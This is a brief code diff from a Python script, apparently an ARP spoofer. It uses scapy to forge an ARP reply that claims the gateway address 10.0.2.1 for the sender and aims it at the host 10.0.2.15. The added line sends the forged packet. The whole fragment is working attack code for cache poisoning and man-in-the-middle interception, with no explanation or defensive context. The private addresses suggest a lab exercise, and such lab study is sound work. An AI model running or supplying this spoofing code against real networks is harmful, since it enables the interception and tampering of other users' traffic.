@@ -3,3 +3,4 @@
 import scapy.all as scapy
 
 packet = scapy.ARP(op=2, pdst="10.0.2.15", hwdst="08:00:27:e6:e5:59", psrc="10.0.2.1")
+scapy.send(packet)
